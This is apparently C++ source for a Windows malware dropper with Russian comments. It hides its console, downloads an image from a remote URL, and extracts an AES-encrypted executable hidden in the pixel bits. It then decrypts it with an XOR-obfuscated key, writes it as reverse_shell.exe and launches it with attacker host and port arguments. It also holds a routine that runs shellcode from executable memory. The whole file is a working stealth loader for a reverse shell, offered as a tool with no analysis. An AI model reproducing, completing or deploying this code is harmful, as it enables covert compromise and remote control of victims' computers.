#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <vector>
#include <string>
#include <iostream>
#include <fstream>
#include <iomanip>
#include <sstream>
#include <stdexcept>
#include <cstdint>


#define STB_IMAGE_IMPLEMENTATION
#include "stb_image.h"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")

#define R_HOST R_HOST_PLACEHOLDER
#define R_PORT R_PORT_PLACEHOLDER


bool CreateDirectoryRecursively(const std::string& path) {
    size_t pos = 0;
    std::string folder;
    int status = 0;

    while ((pos = path.find_first_of("\\/", pos)) != std::string::npos) {
        folder = path.substr(0, pos++);
        if (folder.empty()) continue;
        status = CreateDirectoryA(folder.c_str(), NULL);
        if (status == 0 && GetLastError() != ERROR_ALREADY_EXISTS) {
            return false;
        }
    }
    status = CreateDirectoryA(path.c_str(), NULL);
    if (status == 0 && GetLastError() != ERROR_ALREADY_EXISTS) {
        return false;
    }
    return true;
}


void extract_encrypted_exe_from_image(const std::string& stego_image_path,
    const std::string& output_exe_path) {
    const size_t HEADER_LEN_BYTES = 8;

    int width = 0, height = 0, channels = 0;
    unsigned char* img = stbi_load(stego_image_path.c_str(), &width, &height, &channels, 4); // RGBA
    if (!img) throw std::runtime_error("Failed to load image: " + stego_image_path);

    size_t total_slots = static_cast<size_t>(width) * static_cast<size_t>(height) * 4u;
    if (total_slots < HEADER_LEN_BYTES * 8) {
        stbi_image_free(img);
        throw std::runtime_error("Image too small to hold header");
    }

    // header: читаем по 8 LSB -> байт (MSB-first внутри байта)
    uint8_t header_bytes[HEADER_LEN_BYTES] = { 0 };
    for (size_t i = 0; i < HEADER_LEN_BYTES; ++i) {
        uint8_t byte = 0;
        for (size_t b = 0; b < 8; ++b) {
            size_t bit_index = i * 8 + b;
            uint8_t bit = img[bit_index] & 1u;
            byte |= static_cast<uint8_t>(bit << (7 - b)); // MSB-first inside byte
        }
        header_bytes[i] = byte;
    }

    // header is little-endian uint64
    uint64_t payload_len = 0;
    for (size_t i = 0; i < HEADER_LEN_BYTES; ++i) {
        payload_len |= (static_cast<uint64_t>(header_bytes[i]) << (8 * i));
    }

    uint64_t needed_bits = (HEADER_LEN_BYTES + payload_len) * 8ull;
    if (needed_bits > total_slots) {
        stbi_image_free(img);
        throw std::runtime_error("Not enough capacity in image for claimed payload");
    }

    std::vector<uint8_t> payload;
    payload.resize(static_cast<size_t>(payload_len));

    // Extract payload starting after header bits
    for (size_t i = 0; i < payload_len; ++i) {
        uint8_t byte = 0;
        for (size_t b = 0; b < 8; ++b) {
            size_t bit_index = HEADER_LEN_BYTES * 8ull + i * 8ull + b;
            uint8_t bit = img[bit_index] & 1u;
            byte |= static_cast<uint8_t>(bit << (7 - b));
        }
        payload[i] = byte;
    }

    std::ofstream out(output_exe_path, std::ios::binary);
    if (!out) {
        stbi_image_free(img);
        throw std::runtime_error("Failed to open output file: " + output_exe_path);
    }
    out.write(reinterpret_cast<const char*>(payload.data()),
        static_cast<std::streamsize>(payload.size()));
    out.close();

    stbi_image_free(img);
    std::cout << "[OK] Extracted payload: " << payload_len << " bytes to " << output_exe_path << "\n";
}

class WinHttpHandle {
public:
    explicit WinHttpHandle(HINTERNET h = nullptr) : handle(h) {}
    ~WinHttpHandle() { if (handle) WinHttpCloseHandle(handle); }
    HINTERNET get() const { return handle; }
private:
    HINTERNET handle;
};

std::vector<BYTE> DownloadPayload(LPCWSTR url) {
    std::vector<BYTE> buffer;
    WinHttpHandle hSession(WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0));
    if (!hSession.get()) return buffer;

    URL_COMPONENTS urlComp = { 0 };
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = -1;
    urlComp.dwHostNameLength = -1;
    urlComp.dwUrlPathLength = -1;
    urlComp.dwExtraInfoLength = -1;

    if (!WinHttpCrackUrl(url, 0, 0, &urlComp)) return buffer;

    std::wstring host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if (urlComp.dwExtraInfoLength > 0)
        path.append(urlComp.lpszExtraInfo, urlComp.dwExtraInfoLength);

    WinHttpHandle hConnect(WinHttpConnect(hSession.get(), host.c_str(), urlComp.nPort, 0));
    if (!hConnect.get()) return buffer;

    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    WinHttpHandle hRequest(WinHttpOpenRequest(hConnect.get(), L"GET", path.c_str(), nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags));
    if (!hRequest.get()) return buffer;

    if (WinHttpSendRequest(hRequest.get(), WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest.get(), nullptr)) {
        DWORD bytesAvail = 0;
        while (WinHttpQueryDataAvailable(hRequest.get(), &bytesAvail) && bytesAvail) {
            std::vector<BYTE> temp(bytesAvail);
            DWORD bytesRead = 0;
            if (WinHttpReadData(hRequest.get(), temp.data(), bytesAvail, &bytesRead) && bytesRead)
                buffer.insert(buffer.end(), temp.begin(), temp.begin() + bytesRead);
            else
                break;
        }
    }
    return buffer;
}

std::vector<BYTE> AesDecrypt(const std::vector<BYTE>& ciphertext,
    const std::vector<BYTE>& key,
    const std::vector<BYTE>& iv) {
    HCRYPTPROV hProv = NULL;
    HCRYPTKEY hKey = NULL;
    HCRYPTHASH hHash = NULL;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        throw std::runtime_error("CryptAcquireContext failed");
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        throw std::runtime_error("CryptCreateHash failed");
    }

    if (!CryptHashData(hHash, key.data(), (DWORD)key.size(), 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        throw std::runtime_error("CryptHashData failed");
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        throw std::runtime_error("CryptDeriveKey failed");
    }

    CryptDestroyHash(hHash);

    if (!CryptSetKeyParam(hKey, KP_IV, iv.data(), 0)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        throw std::runtime_error("CryptSetKeyParam failed");
    }

    DWORD dwDataLen = (DWORD)ciphertext.size();
    std::vector<BYTE> buffer = ciphertext;

    if (!CryptDecrypt(hKey, 0, TRUE, 0, buffer.data(), &dwDataLen)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        throw std::runtime_error("CryptDecrypt failed");
    }

    buffer.resize(dwDataLen);
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return buffer;
}

void ExecutePayload(const std::vector<BYTE>& payload) {
    if (payload.empty()) return;
    void* execMem = VirtualAlloc(nullptr, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) return;
    memcpy(execMem, payload.data(), payload.size());
    reinterpret_cast<void(*)()>(execMem)();
}

std::vector<BYTE> ReadFileFromPath(const std::string& filePath) {
    std::vector<BYTE> buffer;
    std::ifstream file(filePath, std::ios::binary);

    if (!file.is_open()) {
        return buffer;
    }

    // Определяем размер файла
    file.seekg(0, std::ios::end);
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    // Читаем файл в буфер
    buffer.resize(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        buffer.clear();
    }

    return buffer;
}

bool ExecuteExe(const std::string& filePath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // Полная командная строка: путь + аргументы
    std::string cmd = "\"" + filePath + "\" -r_host " + std::string(R_HOST) + " -r_port " + std::to_string(R_PORT);

    char* cmdLine = _strdup(cmd.c_str());

    if (!CreateProcessA(
        nullptr,   // путь к exe в командной строке
        cmdLine,   // полный путь + аргументы
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        free(cmdLine);
        return false;
    }

    free(cmdLine);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return true;
}


bool WriteToFile(const std::vector<BYTE>& data, const std::string& filePath) {
    std::ofstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Failed to open file for writing: " << filePath << std::endl;
        return false;
    }

    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    file.close();

    return !file.fail();
}

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    const std::wstring url_1 = L"...";
    const std::vector<BYTE> aesKey = { ... };
    const std::vector<BYTE> aesIV  = { ... };
 //const std::vector<BYTE> data_enc = { 0x5e, 0x89, 0xc, 0xed, 0xa0, 0xe9, 0xc5, 0xb7, 0x38, 0x12, 0xaf, 0xfa, 0x76, 0x33, 0x2d, 0xa5, 0x73, 0x12, 0x8a, 0x74, 0xb3, 0x90, 0x7b, 0x4, 0x3f, 0x53, 0x66, 0xea, 0x19, 0xf6, 0x89, 0xb4 };
    //std::string filePath = "C:\\PROFF\\EncryptedData\\license.txt";
    std::wstring urlW(url_1.begin(), url_1.end());
    LPCWSTR url = urlW.c_str();
    auto binaryData = DownloadPayload(url);
    BYTE obfuscation_key = 0x7A;

    // Деобфускация ключа и IV
    std::vector<BYTE> deobfuscated_key;
    for (size_t i = 0; i < aesKey.size(); ++i) {
        BYTE obfuscated_byte = static_cast<BYTE>(aesKey[i] ^ static_cast<BYTE>(obfuscation_key + static_cast<BYTE>(i)));
        deobfuscated_key.push_back(obfuscated_byte);
    }

    std::vector<BYTE> deobfuscated_IV;
    for (size_t i = 0; i < aesIV.size(); ++i) {
        BYTE obfuscated_byte = static_cast<BYTE>(aesIV[i] ^ static_cast<BYTE>(obfuscation_key + static_cast<BYTE>(i)));
        deobfuscated_IV.push_back(obfuscated_byte);
    }
    CreateDirectoryRecursively("C:\\VM");
    std::string tempExePath = "C:\\VM\\reverse_shell.png";
    std::string tempExePath1 = "C:\\VM\\reverse_shell.exe";
    if (!WriteToFile(binaryData, tempExePath)) {
        std::cerr << "Failed to write decrypted payload to file" << std::endl;
        return 1;
    }
    extract_encrypted_exe_from_image(tempExePath, "C:\\VM\\reverse_shell.txt");
    auto goodExe = ReadFileFromPath("C:\\VM\\reverse_shell.txt");
    // Используем деобфусцированные ключ и IV для дешифрования
    auto decryptedPayload = AesDecrypt(goodExe, deobfuscated_key, deobfuscated_IV);
    if (decryptedPayload.empty()) return 1;
    
    if (!WriteToFile(decryptedPayload, tempExePath1)) {
        std::cerr << "Failed to write decrypted payload to file" << std::endl;
        return 1;
    }

    // Запускаем исполняемый файл
    if (!ExecuteExe(tempExePath1)) {
        std::cerr << "Failed to execute the decrypted payload" << std::endl;
        return 1;
    }

    std::cout << "Payload executed successfully" << std::endl;

    return 0;
}